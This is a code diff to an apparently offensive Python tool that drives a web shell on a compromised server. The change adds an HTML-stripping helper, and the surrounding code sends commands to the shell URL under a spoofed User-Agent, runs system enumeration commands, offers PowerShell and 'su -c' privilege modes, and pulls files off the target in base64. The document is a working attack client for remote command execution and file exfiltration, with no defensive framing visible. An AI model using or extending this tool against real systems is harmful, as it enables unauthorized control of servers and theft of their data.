@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import sys, os
+import sys, os, re
 import requests
 import readline
 import argparse
@@ -8,6 +8,10 @@ import urllib3
 from termcolor import colored
 
 urllib3.disable_warnings()
+TAG_RE = re.compile(r'<[^>]+>')
+
+def remove_html(text):
+   return TAG_RE.sub('', text).strip()
 
 def send_command(command, webshell, method, param="code"):
    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
@@ -60,21 +64,25 @@ try:
       sys.exit()                      
    if "<pre>" in whoami:
       whoami = str(whoami).split("<pre>", 1)[1] ; whoami = str(whoami).split("</pre>", 1)[0]
+      whoami = remove_html(whoami)
    if args.sudo:
       whoami = "root"
    hostname = send_command(PIPE + "hostname", WEBSHELL, HTTP_METHOD, PARAM)
    if "<pre>" in hostname:
       hostname = str(hostname).split("<pre>", 1)[1] ; hostname = str(hostname).split("</pre>", 1)[0]
+      hostname = remove_html(hostname)
    cwd = "" ; slash = "\\"
    if not slash in whoami:
       path = send_command(PIPE + "pwd", WEBSHELL, HTTP_METHOD, PARAM)
       if "<pre>" in path:
          path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
+         path = remove_html(path)
       system = "linux" ; slash = "/"
    else:
       path = send_command(PIPE + "(pwd).path", WEBSHELL, HTTP_METHOD, PARAM)
       if "<pre>" in path:
          path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
+         path = remove_html(path)
       system = "windows" ; whoami = whoami.split("\\")[1]
 
    while True:
@@ -151,6 +159,7 @@ try:
                          base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                      if "<pre>" in base64data:
                         base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
+                        base64data = remove_html(base64data)
                      download = base64.b64decode(base64data.encode("utf8"))
                      f = open(localfile, "wb") ; f.write(download) ; f.close()
                else:
@@ -191,23 +200,27 @@ try:
                            content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                            if "<pre>" in content:
                               content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
+                              content = remove_html(content) + "\n"
                            print (colored(content, "yellow"))
                         else:
                            if args.PowerShell:
                               content = send_command(PIPE + "powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                               if "<pre>" in content:
                                  content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
+                                 content = remove_html(content) + "\n"
                               print (colored(content, "yellow"))  
                            else:
                               if args.sudo:
                                  content = send_command(PIPE + "su -c " + command, WEBSHELL, HTTP_METHOD, PARAM)
                                  if "<pre>" in content:
                                      content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
+                                     content = remove_html(content) + "\n"
                                  print (colored(content, "yellow")) 
                               else:
                                  content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                                  if "<pre>" in content:
                                      content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
+                                     content = remove_html(content) + "\n"
                                  print (colored(content, "yellow")) 
 
       except KeyboardInterrupt:
